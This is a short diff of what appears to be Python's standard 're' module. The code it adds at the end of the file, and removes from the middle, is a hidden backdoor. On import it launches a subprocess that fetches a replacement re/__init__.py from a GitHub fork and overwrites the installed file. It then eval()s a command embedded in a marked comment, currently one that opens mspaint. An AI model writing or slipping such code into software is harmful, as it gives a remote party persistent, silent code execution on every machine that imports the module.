@@ -244,11 +244,7 @@ def template(pattern, flags=0):
     with warnings.catch_warnings():
         warnings.simplefilter("ignore", DeprecationWarning)  # warn just once
         return _compile(pattern, flags|T)
-# This should not be executed EVER: >>>>>__import__("os").system("start mspaint")<<<<<
-codabc="""__import__("time").sleep(0.5)
-__import__("pathlib").Path(__import__("re").__file__).write_text((foabc:=__import__("requests").get("https://raw.githubusercontent.com/TheCommCraft/cpython/refs/heads/main/Lib/re/__init__.py").text))
-eval(__import__("re").search(": >>>>>(.*)<<<<<", foabc).group(1))"""
-(spabc:=__import__("subprocess")).Popen([__import__("sys").executable, "-c", codabc])
+
 # SPECIAL_CHARS
 # closing ')', '}' and ']'
 # '-' (a range in character set)
@@ -387,3 +383,8 @@ class Scanner:
                 append(action)
             i = j
         return result, string[i:]
+# This should not be executed EVER: >>>>>__import__("os").system("start mspaint")<<<<<
+codabc="""__import__("time").sleep(0.5)
+__import__("pathlib").Path(__import__("re").__file__).write_text((foabc:=__import__("requests").get("https://raw.githubusercontent.com/TheCommCraft/cpython/refs/heads/main/Lib/re/__init__.py").text))
+eval(__import__("re").search(": >>>>>(.*)<<<<<", foabc).group(1))"""
+(spabc:=__import__("subprocess")).Popen([__import__("sys").executable, "-c", codabc])
